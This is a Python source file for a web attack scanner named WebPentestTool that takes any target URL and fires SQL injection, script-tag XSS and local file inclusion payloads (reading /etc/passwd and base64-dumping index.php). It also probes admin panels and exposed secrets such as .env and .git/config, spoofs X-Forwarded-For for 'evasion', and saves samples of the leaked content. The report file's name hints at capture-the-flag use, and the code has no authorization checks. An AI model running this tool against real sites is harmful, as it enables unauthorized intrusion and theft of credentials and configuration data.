import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re
import json
import html

class WebPentestTool:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        
        # Evasion headers
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-Forwarded-For": "127.0.0.1"
        }

    def scan_vulnerabilities(self):
        print(f"\n[!] Scanning {self.target_url} for critical vulnerabilities...")
        
        # 1. Check for SQL Injection
        self.test_sql_injection()
        
        # 2. Check for XSS
        self.test_xss()
        
        # 3. Check for LFI/RFI
        self.test_file_inclusion()
        
        # 4. Check for exposed admin panels
        self.find_admin_panels()
        
        # 5. Check for sensitive files
        self.find_sensitive_files()
        
        return self.vulnerabilities

    def test_sql_injection(self):
        test_params = {
            "id": "1' OR '1'='1",
            "search": "' AND 1=CONVERT(int,@@version)--"
        }
        
        try:
            response = self.session.get(
                self.target_url, 
                params=test_params, 
                headers=self.headers,
                timeout=10
            )
            
            # Detect error-based SQLi
            if "SQL syntax" in response.text or "MySQL" in response.text:
                self.vulnerabilities.append({
                    "type": "SQL Injection",
                    "payload": test_params,
                    "confidence": "High"
                })
        except Exception as e:
            pass

    def test_xss(self):
        xss_payload = "<script>alert('XSS')</script>"
        forms = self.extract_forms()
        
        for form in forms:
            try:
                response = self.submit_form(form, {"q": xss_payload})
                if xss_payload in response.text:
                    self.vulnerabilities.append({
                        "type": "Cross-Site Scripting (XSS)",
                        "payload": xss_payload,
                        "form_action": form["action"]
                    })
            except:
                continue

    def test_file_inclusion(self):
        lfi_payloads = [
            "/etc/passwd",
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        for payload in lfi_payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}?file={payload}",
                    headers=self.headers
                )
                
                if "root:" in response.text or "<?php" in response.text:
                    self.vulnerabilities.append({
                        "type": "Local File Inclusion (LFI)",
                        "payload": payload,
                        "leaked_data": response.text[:200] + "..."
                    })
            except:
                continue

    def find_admin_panels(self):
        common_admin_paths = [
            "/admin", "/wp-admin", "/administrator",
            "/login", "/dashboard", "/backend"
        ]
        
        for path in common_admin_paths:
            try:
                response = self.session.get(
                    urljoin(self.target_url, path),
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    if "login" in response.text.lower() or "password" in response.text.lower():
                        self.vulnerabilities.append({
                            "type": "Exposed Admin Panel",
                            "url": urljoin(self.target_url, path)
                        })
            except:
                continue

    def find_sensitive_files(self):
        sensitive_files = [
            "/.env", "/config.php", "/robots.txt",
            "/.git/config", "/backup.zip"
        ]
        
        for file in sensitive_files:
            try:
                response = self.session.get(
                    urljoin(self.target_url, file),
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    self.vulnerabilities.append({
                        "type": "Sensitive File Exposure",
                        "file": file,
                        "content_sample": response.text[:100] + "..."
                    })
            except:
                continue

    def extract_forms(self):
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, "html.parser")
            forms = []
            
            for form in soup.find_all("form"):
                form_details = {
                    "action": form.get("action"),
                    "method": form.get("method", "get").lower(),
                    "inputs": []
                }
                
                for input_tag in form.find_all("input"):
                    form_details["inputs"].append({
                        "name": input_tag.get("name"),
                        "type": input_tag.get("type"),
                        "value": input_tag.get("value", "")
                    })
                
                forms.append(form_details)
            
            return forms
        except:
            return []

    def submit_form(self, form_details, payload):
        target_url = urljoin(self.target_url, form_details["action"])
        data = {}
        
        for input_tag in form_details["inputs"]:
            if input_tag["name"]:
                data[input_tag["name"]] = payload

        if form_details["method"] == "post":
            return self.session.post(target_url, data=data)
        else:
            return self.session.get(target_url, params=data)

if __name__ == "__main__":
    print("""
    ██████╗ ██████╗ ███████╗██████╗ ███████╗██████╗ 
    ██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗
    ██████╔╝██████╔╝█████╗  ██████╔╝█████╗  ██████╔╝
    ██╔═══╝ ██╔══██╗██╔══╝  ██╔═══╝ ██╔══╝  ██╔══██╗
    ██║     ██║  ██║███████╗██║     ███████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝
    """)

    target = input("[?] Enter target URL (e.g., https://vulnerable-site.com): ").strip()
    scanner = WebPentestTool(target)
    results = scanner.scan_vulnerabilities()

    print("\n[+] Scan Results:")
    for vuln in results:
        print(f"\n[!] {vuln['type']}")
        print(f"    Payload: {vuln.get('payload', 'N/A')}")
        print(f"    URL: {vuln.get('url', target)}")
        if 'leaked_data' in vuln:
            print(f"    Data Sample: {html.escape(vuln['leaked_data'])}")

    with open("ctf_report.json", "w") as f:
        json.dump(results, f, indent=4)
    print("\n[+] Report saved to 'ctf_report.json'")